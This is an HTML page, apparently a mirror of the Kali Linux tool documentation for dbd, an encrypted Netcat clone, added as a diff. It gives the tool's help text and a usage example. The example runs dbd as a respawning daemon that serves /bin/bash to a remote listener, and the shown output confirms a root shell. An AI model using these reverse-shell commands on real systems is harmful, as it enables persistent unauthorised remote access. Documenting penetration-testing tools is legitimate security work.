@@ -1,0 +1,83 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>kali工具箱</title>
+<script src="./static/bootstrap.min.js"></script>
+<link rel="stylesheet" href="./static/main.css">
+<link rel="stylesheet" href="./static/bootstrap.min.css">
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+<section class="l-section"><div class="l-section-h i-cf"><h2>dbd Package Description</h2>
+<p style="text-align: justify;">dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License.</p>
+<p>Source: https://github.com/gitdurandal/dbd<br>
+<a href="https://github.com/gitdurandal/dbd" variation="deepblue" target="blank">dbd Homepage</a> | <a href="http://git.kali.org/gitweb/?p=packages/dbd.git;a=summary" variation="deepblue" target="blank">Kali dbd Repo</a></p>
+<ul>
+<li>Author: Kyle Barnthouse</li>
+<li>License: GPLv3</li>
+</ul>
+<h3>Tools included in the dbd package</h3>
+<h5>dbd – Netcat clone with encryption</h5>
+<code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5e2c31312a1e353f3237">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# dbd -h<br>
+dbd 1.50 Copyright (C) 2013 Kyle Barnthouse &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="63071611020d07020f23040a17011106144d0c1104">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;<br>
+$Id: dbd.c,v 1.50 2013/05/20 15:40:00 durandal Exp $<br>
+<br>
+This program is free software; you can redistribute it and/or modify it under<br>
+the terms of the GNU General Public License as published by the Free Software<br>
+Foundation; either version 2 of the License, or (at your option) any later<br>
+version.<br>
+<br>
+connect (tcp): dbd [-options] host port<br>
+listen (tcp):  dbd -l -p port [-options]<br>
+options:<br>
+    -l          listen for incoming connection<br>
+    -p n        choose port to listen on, or source port to connect out from<br>
+    -a address  choose an address to listen on or connect out from<br>
+    -e prog     program to execute after connect (e.g. -e cmd.exe or -e bash)<br>
+    -r n        infinitely respawn/reconnect, pause for n seconds between<br>
+                connection attempts. -r0 can be used to re-listen after<br>
+                disconnect (just like a regular daemon)<br>
+    -c on|off   encryption on/off. specify whether you want to use the built-in<br>
+                AES-CBC-128 + HMAC-SHA1 encryption implementation (by<br>
+                Christophe Devine - http://www.cr0.net:8040/) or not<br>
+                default is: -c on<br>
+    -k secret   override default phrase to use for encryption (secret must be<br>
+                shared between client and server)<br>
+    -q          hush, quiet, don't print anything (overrides -v)<br>
+    -v          be verbose<br>
+    -n          toggle numeric-only IP addresses (don't do DNS resolution). if<br>
+                you specify -n twice, original state will be active (i.e. -n<br>
+                works like a on/off switch)<br>
+    -m          toggle monitoring (snooping) on/off (only used with the -e<br>
+                option). snooping can also be turned on by specifying -vv (-v<br>
+                two times)<br>
+    -P prefix   add prefix (+ a hardcoded separator) to all outbound data.<br>
+                this option is mostly only useful for dbd in "chat mode" (to<br>
+                prefix lines you send with your nickname)<br>
+    -H on|off   highlight incoming data with a hardcoded (color) escape<br>
+                sequence (for e.g. chatting). default is: -H off<br>
+    -V          print version banner and exit (include that output in your<br>
+                bug report and send bug report to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="abc6c2c8c3cec785c9c7c4c6ccd9cec5ebdfc2ccced9dfcecac685d8ce">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>)<br>
+unix-like OS specific options:<br>
+    -s          invoke a shell, nothing else. if dbd is setuid 0, it'll invoke<br>
+                a root shell<br>
+    -w n        "immobility timeout" in seconds for idle read/write operations<br>
+                and program execution (the -e option)<br>
+    -D on|off   fork and run in background (daemonize). default: -D off</code>
+<h3>dbd Usage Example</h3>
+<p>On the client, respawn every 2400 seconds <b><i>(-r 2400)</i></b>, run as a daemon <b><i>(-D on)</i></b>, display verbose output <b><i>(-v)</i></b>, and serve a bash shell <b><i>(-e /bin/bash)</i></b>, connecting to the remote host <b><i>(192.168.1.202)</i></b> on port 8080 <b><i>(8080)</i></b>.<br>
+On the server, listen for a connection <b><i>(-l)</i></b> on port 8080 <b><i>(-p8080)</i></b>, and display verbose output <b><i>(-v)</i></b>.</p>
+<code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="41332e2e35012a202d28">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080</code>
+<code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7c5d8d8c3f7dcd6dbde">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# dbd -l -p8080 -v<br>
+listening on port 8080<br>
+reverse lookup of 192.168.1.202 failed: Unknown server error<br>
+connect to 192.168.1.202:8080 from 192.168.1.202:58651 (n/a)<br>
+id<br>
+uid=0(root) gid=0(root) groups=0(root)</code>
+</div></section><div style="display:none">
+<script src="//s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
+</div>
+</main></body></html>
